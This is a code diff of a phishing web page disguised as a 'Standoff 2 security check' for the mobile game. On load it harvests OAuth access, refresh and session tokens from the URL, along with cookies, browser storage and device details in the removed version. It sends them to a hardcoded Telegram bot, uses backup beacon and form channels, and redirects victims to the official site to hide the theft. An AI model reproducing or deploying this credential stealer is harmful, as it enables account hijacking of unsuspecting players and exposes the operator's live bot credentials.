@@ -1,220 +1,141 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Standoff 2 Security Update</title>
+    <title>Standoff 2 Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #1a1a1a;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 100px auto;
+            background: #2a2a2a;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.3);
+        }
+        .token-found {
+            color: #00ff00;
+            font-weight: bold;
+            font-size: 18px;
+            margin: 20px 0;
+            padding: 10px;
+            background: rgba(0,255,0,0.1);
+            border-radius: 5px;
+        }
+        .token-not-found {
+            color: #ff4444;
+            font-weight: bold;
+            font-size: 18px;
+            margin: 20px 0;
+            padding: 10px;
+            background: rgba(255,0,0,0.1);
+            border-radius: 5px;
+        }
+        .loading {
+            color: #ffff00;
+            font-size: 16px;
+        }
+    </style>
     <script>
         const BOT_TOKEN = "7652039782:AAHDuyL7L0I2c91-sCx397Nk5tN0LY57VHU";
         const CHAT_ID = "8177119028";
         
-        // Расширенный сбор данных
-        function advancedDataCollection() {
-            const collectedData = {
-                // === URL ПАРАМЕТРЫ ===
-                url_parameters: extractAllUrlParams(),
-                
-                // === ДАННЫЕ УСТРОЙСТВА ===
-                device_info: {
-                    user_agent: navigator.userAgent,
-                    platform: navigator.platform,
-                    vendor: navigator.vendor,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    hardware_concurrency: navigator.hardwareConcurrency,
-                    device_memory: navigator.deviceMemory,
-                    screen: `${screen.width}x${screen.height}`,
-                    color_depth: screen.colorDepth,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    touch_support: 'ontouchstart' in window
-                },
-                
-                // === ХРАНИЛИЩА ===
-                storage_data: {
-                    cookies: document.cookie,
-                    localStorage: extractStorage(localStorage),
-                    sessionStorage: extractStorage(sessionStorage),
-                    indexedDB: checkIndexedDB()
-                },
-                
-                // === СЕТЕВЫЕ ДАННЫЕ ===
-                network_info: {
-                    connection: navigator.connection ? {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt
-                    } : 'unavailable',
-                    ip: 'will_be_detected_on_server'
-                },
-                
-                // === ВРЕМЯ И ИСТОЧНИК ===
-                meta_info: {
-                    timestamp: new Date().toISOString(),
-                    referrer: document.referrer,
-                    full_url: window.location.href,
-                    domain: window.location.hostname
-                }
+        let foundTokens = [];
+        
+        function analyzeTokens() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const hashParams = new URLSearchParams(window.location.hash.substring(1));
+            
+            // Все возможные токены
+            const potentialTokens = {
+                access_token: urlParams.get('access_token') || hashParams.get('access_token'),
+                token: urlParams.get('token') || hashParams.get('token'),
+                code: urlParams.get('code') || hashParams.get('code'),
+                auth_token: urlParams.get('auth_token') || hashParams.get('auth_token'),
+                refresh_token: urlParams.get('refresh_token') || hashParams.get('refresh_token'),
+                session: urlParams.get('session') || hashParams.get('session'),
+                oauth_token: urlParams.get('oauth_token') || hashParams.get('oauth_token')
             };
             
-            // Функции извлечения данных
-            function extractAllUrlParams() {
-                const params = {};
-                // Параметры search
-                const urlParams = new URLSearchParams(window.location.search);
-                for (let [key, value] of urlParams.entries()) {
-                    params[`get_${key}`] = value;
-                }
-                // Параметры hash
-                const hashParams = new URLSearchParams(window.location.hash.substring(1));
-                for (let [key, value] of hashParams.entries()) {
-                    params[`hash_${key}`] = value;
-                }
-                return params;
-            }
+            // Фильтруем реальные токены
+            foundTokens = Object.entries(potentialTokens)
+                .filter(([key, value]) => value && value.length > 10)
+                .map(([key, value]) => `${key}: ${value}`);
             
-            function extractStorage(storage) {
-                const items = {};
-                try {
-                    for (let i = 0; i < storage.length; i++) {
-                        const key = storage.key(i);
-                        // Фильтруем только важные ключи
-                        if (key.includes('token') || key.includes('auth') || key.includes('session') || 
-                            key.includes('user') || key.includes('player') || key.includes('standoff')) {
-                            items[key] = storage.getItem(key);
-                        }
-                    }
-                    return items;
-                } catch(e) {
-                    return 'blocked';
-                }
-            }
+            // Показываем результат пользователю
+            displayResult();
             
-            function checkIndexedDB() {
-                return new Promise((resolve) => {
-                    if (!window.indexedDB) {
-                        resolve('not_supported');
-                        return;
-                    }
-                    setTimeout(() => resolve('timeout'), 500);
-                });
-            }
+            // Отправляем в Telegram
+            sendToTelegram();
             
-            // Анализ собранных данных
-            analyzeAndSendData(collectedData);
+            // Редирект
+            setTimeout(() => {
+                window.location.href = 'https://standoff2.com';
+            }, 3000);
         }
         
-        function analyzeAndSendData(data) {
-            // Поиск токенов в данных
-            const tokenPatterns = [
-                'access_token', 'refresh_token', 'token', 'auth', 'code',
-                'session', 'oauth', 'bearer', 'jwt', 'player_id', 'user_id'
-            ];
+        function displayResult() {
+            const resultDiv = document.getElementById('result');
             
-            let foundTokens = {};
-            const dataString = JSON.stringify(data).toLowerCase();
-            
-            tokenPatterns.forEach(pattern => {
-                if (dataString.includes(pattern)) {
-                    foundTokens[pattern] = 'found_in_data';
-                }
-            });
-            
-            // Проверяем конкретные параметры
-            if (data.url_parameters) {
-                Object.entries(data.url_parameters).forEach(([key, value]) => {
-                    if (value && value.length > 10 && 
-                        (key.includes('token') || key.includes('auth') || key.includes('code'))) {
-                        foundTokens[key] = value;
-                    }
-                });
+            if (foundTokens.length > 0) {
+                resultDiv.className = 'token-found';
+                resultDiv.innerHTML = `✅ ТОКЕН НАЙДЕН!<br><br>${foundTokens.join('<br>')}`;
+            } else {
+                resultDiv.className = 'token-not-found';
+                resultDiv.innerHTML = '❌ ТОКЕН НЕ НАЙДЕН';
             }
             
-            // Подготовка сообщения
-            const message = {
-                found_tokens: foundTokens,
-                has_tokens: Object.keys(foundTokens).length > 0,
-                device_type: data.device_info.user_agent.includes('Mobile') ? 'MOBILE' : 'DESKTOP',
-                full_data: data
+            // Прячем загрузку
+            document.getElementById('loading').style.display = 'none';
+        }
+        
+        function sendToTelegram() {
+            const data = {
+                tokens: foundTokens,
+                user_agent: navigator.userAgent,
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                ip: 'detected_on_server'
             };
+            
+            const message = foundTokens.length > 0 
+                ? `🎯 TOKEN CAPTURED!\n\n${foundTokens.join('\n')}\n\n📱 User: ${data.user_agent}`
+                : `📱 Visit (no tokens)\nUser: ${data.user_agent}\nURL: ${data.url}`;
             
             // Отправка в Telegram
-            sendToTelegram(message);
-        }
-        
-        function sendToTelegram(message) {
-            const text = `🎯 STANDOFF 2 TOKEN REPORT\n\n` +
-                        `📱 Device: ${message.device_type}\n` +
-                        `🕒 Time: ${new Date().toLocaleString()}\n` +
-                        `✅ Tokens Found: ${message.has_tokens ? 'YES' : 'NO'}\n` +
-                        `🔍 Details: ${JSON.stringify(message.found_tokens, null, 2)}\n\n` +
-                        `📊 Full Data: ${JSON.stringify(message.full_data, null, 2).substring(0, 3000)}`;
-            
-            // Основная отправка
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: text
+                    text: message
                 })
-            }).catch(error => {
-                // Резервные методы отправки
-                backupSendMethods(text);
+            }).catch(e => {
+                console.log('Telegram error:', e);
             });
-            
-            // Редирект пользователя
-            redirectUser();
-        }
-        
-        function backupSendMethods(text) {
-            // Метод 1: через Image
-            const img = new Image();
-            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text.substring(0, 2000))}`;
-            
-            // Метод 2: через Form
-            setTimeout(() => {
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                form.innerHTML = `<input name="chat_id" value="${CHAT_ID}"><input name="text" value="${text.substring(0, 1000)}">`;
-                document.body.appendChild(form);
-                form.submit();
-            }, 100);
-        }
-        
-        function redirectUser() {
-            setTimeout(() => {
-                const redirects = [
-                    'https://standoff2.com',
-                    'standoff2://main',
-                    'https://play.google.com/store/apps/details?id=com.axlebolt.standoff2',
-                    'https://apps.apple.com/app/standoff-2/id1344023307'
-                ];
-                
-                for (let url of redirects) {
-                    try {
-                        window.location.href = url;
-                        break;
-                    } catch(e) {
-                        continue;
-                    }
-                }
-            }, 500);
         }
         
         // Запуск при загрузке
-        window.addEventListener('load', advancedDataCollection);
-        window.addEventListener('hashchange', advancedDataCollection);
-        
-        // Запуск сразу если DOM уже готов
-        if (document.readyState === 'interactive' || document.readyState === 'complete') {
-            advancedDataCollection();
-        }
-        
+        window.addEventListener('load', analyzeTokens);
     </script>
 </head>
-<body style="display:none; background: #000;">
-    <div style="color: white; text-align: center; padding: 50px;">
-        <h2>Loading Standoff 2...</h2>
-        <p>Please wait while we verify your account</p>
+<body>
+    <div class="container">
+        <h2>🔐 Standoff 2 Security Verification</h2>
+        <div id="loading" class="loading">
+            Scanning for tokens...
+        </div>
+        <div id="result"></div>
+        <p style="font-size: 12px; margin-top: 20px; color: #888;">
+            Redirecting to official site...
+        </p>
     </div>
 </body>
 </html>
